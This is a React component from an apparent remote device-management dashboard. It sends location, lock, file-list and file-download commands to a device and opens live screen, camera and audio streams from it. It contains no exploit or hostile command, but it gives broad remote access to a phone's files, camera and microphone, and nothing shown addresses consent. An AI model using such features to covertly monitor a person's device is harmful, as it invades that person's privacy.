import { useMemo, useState } from "react";
import { devicesApi } from "../api/devices";
import { downloadFileViaRelay } from "../api/fileDownload";

interface FileEntryDtoLocal {
  name: string;
  path: string;
  isDirectory: boolean;
  sizeBytes: number | null;
  mimeType: string | null;
}

function formatSize(bytes: number): string {
  if (bytes < 1024) return `${bytes} B`;
  if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(1)} KB`;
  return `${(bytes / (1024 * 1024)).toFixed(1)} MB`;
}

/** Path strings come back as "Download/Pics/photo.jpg" relative to device storage root. */
function parentOf(path: string): string {
  const idx = path.lastIndexOf("/");
  return idx === -1 ? "" : path.slice(0, idx);
}

export default function RemoteActionsCard({
  deviceId,
  onLocationUpdated,
  onStartStream,
  onStartCamera,
  onStartAudio,
}: {
  deviceId: string;
  onLocationUpdated?: () => void;
  onStartStream?: () => void;
  onStartCamera?: () => void;
  onStartAudio?: () => void;
}) {
  const [status, setStatus] = useState<string | null>(null);
  const [files, setFiles] = useState<FileEntryDtoLocal[] | null>(null);
  const [fileListLoading, setFileListLoading] = useState(false);
  const [currentPath, setCurrentPath] = useState("");
  const [popupFile, setPopupFile] = useState<FileEntryDtoLocal | null>(null);
  const [downloading, setDownloading] = useState(false);

  const children = useMemo(() => {
    if (!files) return [];
    return files
      .filter((f) => parentOf(f.path) === currentPath)
      .sort((a, b) => {
        if (a.isDirectory !== b.isDirectory) return a.isDirectory ? -1 : 1;
        return a.name.localeCompare(b.name);
      });
  }, [files, currentPath]);

  const breadcrumbs = currentPath ? currentPath.split("/") : [];

  async function pollCommand(commandId: string, label: string) {
    setStatus(`${label}: waiting for device response...`);
    // Rapid check: 1s interval for the first 6 attempts (so instant responses in 1-3s show immediately)
    // then 2s interval for remaining attempts (up to 45s total).
    const maxAttempts = 25;
    for (let i = 0; i < maxAttempts; i++) {
      const delay = i < 6 ? 1000 : 2000;
      await new Promise((r) => setTimeout(r, delay));
      try {
        const cmd = await devicesApi.getCommand(deviceId, commandId);
        if (cmd.status === "acked") {
          setStatus(`${label}: completed successfully.`);
          return cmd;
        }
        if (cmd.status === "failed") {
          const failMsg = (cmd.result as { message?: string } | undefined)?.message;
          setStatus(`${label}: failed${failMsg ? ` (${failMsg})` : "."}`);
          return cmd;
        }
      } catch {
        // network glitch on dashboard poll — keep trying
      }
    }
    setStatus(`${label}: device is taking longer to respond (may be sleeping or offline). Request remains queued.`);
    return null;
  }

  async function handleLocationCheck() {
    setStatus("Sending location request to device...");
    try {
      const cmd = await devicesApi.createCommand(deviceId, "location_check");
      if (cmd.push && !cmd.push.sent) {
        setStatus(`Command queued (Wake push: ${cmd.push.reason || "unavailable"}). Waiting for device...`);
      } else {
        setStatus("Wake signal sent. Awaiting device location...");
      }
      const result = await pollCommand(cmd.id, "Location check");
      if (result?.status === "acked") {
        onLocationUpdated?.();
      }
    } catch (e) {
      setStatus(`Failed to request location: ${(e as Error).message}`);
    }
  }

  async function handleLock() {
    const cmd = await devicesApi.createCommand(deviceId, "lock");
    await pollCommand(cmd.id, "Lock device");
  }

  /** One click fetches the WHOLE device storage tree in one go; browsing it is done client-side. */
  async function handleFileList() {
    setFileListLoading(true);
    setFiles(null);
    setCurrentPath("");
    setPopupFile(null);
    setStatus(null);
    try {
      const cmd = await devicesApi.createCommand(deviceId, "file_list");
      const result = await pollCommand(cmd.id, "File list");
      if (result?.status === "acked") {
        const full = await devicesApi.getCommand(deviceId, cmd.id);
        setFiles((full.result?.files as FileEntryDtoLocal[]) || []);
      }
    } finally {
      setFileListLoading(false);
    }
  }

  function handleRowClick(file: FileEntryDtoLocal) {
    if (file.isDirectory) {
      setCurrentPath(file.path);
    } else {
      setPopupFile(file);
    }
  }

  async function handleDownload(file: FileEntryDtoLocal) {
    setDownloading(true);
    setStatus(`Preparing download: ${file.name}...`);
    try {
      const cmd = await devicesApi.createCommand(deviceId, "file_download", { path: file.path });
      // Connect to the relay right away — the admin side must be listening
      // before (or very shortly after) the device starts streaming.
      const downloadPromise = downloadFileViaRelay(cmd.id, (s) => setStatus(s));
      await pollCommand(cmd.id, `Download: ${file.name}`);
      await downloadPromise;
      setStatus(`Downloaded ${file.name}.`);
      setPopupFile(null);
    } catch (e) {
      setStatus(`Download failed: ${(e as Error).message}`);
    } finally {
      setDownloading(false);
    }
  }

  return (
    <div className="bg-white rounded-lg shadow-sm p-5">
      <h2 className="font-semibold text-sm mb-4">Remote Actions</h2>
      <div className="flex flex-wrap gap-2 mb-3">
        <ActionButton onClick={handleLocationCheck} label="Check Location Now" />
        <ActionButton onClick={handleLock} label="Lock Device" />
        <ActionButton onClick={handleFileList} label="List Files" loading={fileListLoading} />
        <button
          onClick={() => {
            if (onStartStream) {
              onStartStream();
            } else {
              const el = document.getElementById("live-screen-card");
              if (el) el.scrollIntoView({ behavior: "smooth" });
            }
          }}
          className="flex items-center gap-1.5 bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-500 hover:to-teal-500 text-white text-xs font-semibold px-3 py-2 rounded shadow-sm hover:shadow transition"
        >
          <span className="w-2 h-2 rounded-full bg-emerald-300 animate-pulse" />
          <span>Live Screen Stream</span>
        </button>
        <button
          onClick={() => {
            if (onStartCamera) {
              onStartCamera();
            } else {
              const el = document.getElementById("live-camera-card");
              if (el) el.scrollIntoView({ behavior: "smooth" });
            }
          }}
          className="flex items-center gap-1.5 bg-gradient-to-r from-indigo-600 to-violet-600 hover:from-indigo-500 hover:to-violet-500 text-white text-xs font-semibold px-3 py-2 rounded shadow-sm hover:shadow transition"
        >
          <span className="w-2 h-2 rounded-full bg-indigo-300 animate-pulse" />
          <span>Live Camera Stream</span>
        </button>
        <button
          onClick={() => {
            if (onStartAudio) {
              onStartAudio();
            } else {
              const el = document.getElementById("live-audio-card");
              if (el) el.scrollIntoView({ behavior: "smooth" });
            }
          }}
          className="flex items-center gap-1.5 bg-gradient-to-r from-amber-600 via-orange-600 to-rose-600 hover:from-amber-500 hover:to-rose-500 text-white text-xs font-semibold px-3 py-2 rounded shadow-sm hover:shadow transition"
        >
          <span className="w-2 h-2 rounded-full bg-amber-300 animate-pulse" />
          <span>Live Audio Stream</span>
        </button>
      </div>
      {status && <p className="text-xs text-gray-500 mb-3">{status}</p>}

      {files && (
        <div className="border rounded">
          <div className="flex items-center gap-1 px-3 py-2 border-b bg-gray-50 text-xs overflow-x-auto whitespace-nowrap">
            <button
              onClick={() => setCurrentPath("")}
              className={`hover:underline ${currentPath === "" ? "font-semibold text-gray-700" : "text-accent"}`}
            >
              Storage
            </button>
            {breadcrumbs.map((segment, i) => {
              const segPath = breadcrumbs.slice(0, i + 1).join("/");
              const isLast = i === breadcrumbs.length - 1;
              return (
                <span key={segPath} className="flex items-center gap-1">
                  <span className="text-gray-300">/</span>
                  <button
                    onClick={() => setCurrentPath(segPath)}
                    className={`hover:underline ${isLast ? "font-semibold text-gray-700" : "text-accent"}`}
                  >
                    {segment}
                  </button>
                </span>
              );
            })}
          </div>

          <div className="max-h-96 overflow-y-auto">
            {children.length === 0 ? (
              <p className="text-xs text-gray-400 p-3">This folder is empty.</p>
            ) : (
              <table className="w-full text-xs">
                <tbody className="divide-y">
                  {children.map((f) => (
                    <tr
                      key={f.path}
                      onClick={() => handleRowClick(f)}
                      className="cursor-pointer hover:bg-gray-50"
                    >
                      <td className="px-3 py-1.5">{f.isDirectory ? "📁" : "📄"} {f.name}</td>
                      <td className="px-3 py-1.5 text-gray-500 text-right whitespace-nowrap">
                        {f.sizeBytes != null ? formatSize(f.sizeBytes) : ""}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            )}
          </div>
        </div>
      )}

      {popupFile && (
        <div
          className="fixed inset-0 bg-black/30 flex items-center justify-center z-50"
          onClick={() => !downloading && setPopupFile(null)}
        >
          <div
            className="bg-white rounded-lg shadow-lg p-4 w-72"
            onClick={(e) => e.stopPropagation()}
          >
            <p className="text-sm font-medium mb-1 break-all">📄 {popupFile.name}</p>
            {popupFile.sizeBytes != null && (
              <p className="text-xs text-gray-400 mb-3">{formatSize(popupFile.sizeBytes)}</p>
            )}
            <div className="flex gap-2">
              <button
                onClick={() => handleDownload(popupFile)}
                disabled={downloading}
                className="flex-1 bg-primary text-white text-xs px-3 py-2 rounded hover:bg-primary-dark transition disabled:opacity-50"
              >
                {downloading ? "Downloading..." : "Download"}
              </button>
              <button
                onClick={() => setPopupFile(null)}
                disabled={downloading}
                className="px-3 py-2 text-xs rounded border text-gray-500 hover:bg-gray-50 disabled:opacity-50"
              >
                Cancel
              </button>
            </div>
          </div>
        </div>
      )}

    </div>
  );
}

function ActionButton({
  onClick,
  label,
  loading: externalLoading,
}: {
  onClick: () => void;
  label: string;
  loading?: boolean;
}) {
  const [loading, setLoading] = useState(false);
  const isLoading = externalLoading ?? loading;
  return (
    <button
      onClick={async () => {
        setLoading(true);
        try {
          await onClick();
        } finally {
          setLoading(false);
        }
      }}
      disabled={isLoading}
      className="bg-primary text-white text-xs px-3 py-2 rounded hover:bg-primary-dark transition disabled:opacity-50"
    >
      {isLoading ? "..." : label}
    </button>
  );
}
